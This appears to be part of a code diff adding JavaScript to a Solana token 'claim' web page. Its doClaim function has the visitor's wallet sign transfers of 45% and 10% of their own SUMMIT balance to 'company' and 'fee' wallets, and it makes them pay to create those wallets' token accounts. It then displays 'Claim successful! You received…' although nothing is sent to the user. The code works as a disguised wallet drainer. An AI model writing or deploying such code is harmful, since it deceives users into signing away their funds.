+        document.getElementById('prvTotal').textContent   = data.balance.toFixed(4)  + ' SUMMIT';
+        document.getElementById('prvSigner').textContent  = data.signer.toFixed(4)   + ' SUMMIT';
+        document.getElementById('prvCompany').textContent = data.company.toFixed(4)  + ' SUMMIT';
+        document.getElementById('prvFee').textContent     = data.fee.toFixed(4)      + ' SUMMIT';
+
+        document.getElementById('previewBox').style.display = 'block';
+        document.getElementById('claimBtn').style.display   = 'block';
+        document.getElementById('previewBtn').style.display = 'block';
+
+    } catch(e) {
+        loader(false);
+        show('err3', '❌ Failed to load preview: ' + e.message);
+        document.getElementById('previewBtn').style.display = 'block';
+    }
+}
+
+// ── Do Claim ──
+async function doClaim() {
+    if (!walletAddr || !walletObj) {
+        show('err3','❌ Wallet not connected');
+        return;
+    }
+
+    hide('err3'); hide('ok3'); hide('info3');
+    document.getElementById('claimBtn').disabled   = true;
+    document.getElementById('previewBtn').disabled = true;
+    loader(true);
+    show('info3','⏳ Building transaction...');
+
+    try {
+        // 1. Get tx data from API
+        const res  = await fetch(API + '/build-tx', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ walletAddress: walletAddr })
+        });
+        const data = await res.json();
+
+        if (!data.success) {
+            throw new Error(data.error);
+        }
+
+        show('info3','⏳ Building transaction instructions...');
+
+        const { Connection, PublicKey, Transaction, SystemProgram } = solanaWeb3;
+
+        const connection   = new Connection(RPC, 'confirmed');
+        const walletPK     = new PublicKey(walletAddr);
+        const mintPK       = new PublicKey(TOKEN_MINT);
+        const tokenProgPK  = new PublicKey(TOKEN_PROGRAM);
+        const assocProgPK  = new PublicKey(ASSOC_PROGRAM);
+
+        const tx = new Transaction();
+        tx.recentBlockhash      = data.blockhash;
+        tx.lastValidBlockHeight = data.lastValidBlockHeight;
+        tx.feePayer             = walletPK;
+
+        const signerATA  = new PublicKey(data.accounts.signerATA);
+        const companyATA = new PublicKey(data.accounts.companyATA);
+        const feeATA     = new PublicKey(data.accounts.feeATA);
+        const companyPK  = new PublicKey(data.accounts.companyWallet);
+        const feePK      = new PublicKey(data.accounts.feeWallet);
+
+        // Create ATA if needed
+        if (!data.accounts.companyExists) {
+            tx.add(createATAInstruction(walletPK, companyATA, companyPK, mintPK, tokenProgPK, assocProgPK));
+        }
+        if (!data.accounts.feeExists) {
+            tx.add(createATAInstruction(walletPK, feeATA, feePK, mintPK, tokenProgPK, assocProgPK));
+        }
+
+        // Transfer to company (45%)
+        tx.add(createSPLTransferInstruction(
+            signerATA, companyATA, walletPK,
+            data.amounts.company, tokenProgPK
+        ));
+
+        // Transfer to fee wallet (10%)
+        tx.add(createSPLTransferInstruction(
+            signerATA, feeATA, walletPK,
+            data.amounts.fee, tokenProgPK
+        ));
+
+        show('info3','⏳ Please approve in your wallet...');
+
+        // Sign and send
+        const signed = await walletObj.signTransaction(tx);
+        const sig    = await connection.sendRawTransaction(signed.serialize());
+
+        loader(false);
+        hide('info3');
+        show('ok3',
+            '✅ Claim successful!\n' +
+            'You received: ' + data.summary.signer.toFixed(4) + ' SUMMIT\n' +
+            'TX: ' + sig
+        );
+
+        document.getElementById('claimBtn').disabled   = false;
+        document.getElementById('previewBtn').disabled = false;
+
+        // Refresh preview
+        setTimeout(loadPreview, 3000);
+
+    } catch(e) {
+        loader(false);
+        hide('info3');
+        document.getElementById('claimBtn').disabled   = false;
+        document.getElementById('previewBtn').disabled = false;
+
+        if (e.message?.includes('rejected') || e.message?.includes('User rejected')) {
+            show('err3','⚠️ Transaction cancelled by user.');
+        } else {
+            show('err3','❌ Claim failed: ' + e.message);
+        }
+    }
+}
+
+// ── Build create ATA instruction ──
+function createATAInstruction(payer, ata, owner, mint, tokenProg, assocProg) {
+    const { PublicKey, TransactionInstruction } = solanaWeb3;
+    return new TransactionInstruction({
+        programId: assocProg,
+        keys: [
+            { pubkey: payer,    isSigner: true,  isWritable: true  },
+            { pubkey: ata,      isSigner: false, isWritable: true  },
+            { pubkey: owner,    isSigner: false, isWritable: false },
+            { pubkey: mint,     isSigner: false, isWritable: false },
+            { pubkey: new PublicKey('11111111111111111111111111111111'), isSigner: false, isWritable: false },
+            { pubkey: tokenProg,isSigner: false, isWritable: false },
+        ],
+        data: Buffer.alloc(0)
+    });
+}
+
+// ── Build SPL transfer instruction ──
+function createSPLTransferInstruction(from, to, authority, amount, tokenProg) {
+    const { PublicKey, TransactionInstruction } = solanaWeb3;
+    const data = Buffer.alloc(9);
+    data.writeUInt8(3, 0); // transfer instruction
+    data.writeBigUInt64LE(BigInt(amount), 1);
+    return new TransactionInstruction({
+        programId: tokenProg,
+        keys: [
+            { pubkey: from,      isSigner: false, isWritable: true  },
+            { pubkey: to,        isSigner: false, isWritable: true  },
+            { pubkey: authority, isSigner: true,  isWritable: false },
+        ],
+        data
+    });
+}
+
+// ── UI helpers ──
+function show(id, msg) {
+    const el = document.getElementById(id);
+    el.textContent    = msg;
+    el.style.display  = 'block';
+    el.style.whiteSpace = 'pre-line';
+}
+function hide(id) {
+    document.getElementById(id).style.display = 'none';
+}
+function loader(show) {
+    document.getElementById('loader').style.display = show ? 'block' : 'none';
+}
 </script>
+
 </body>
 </html>
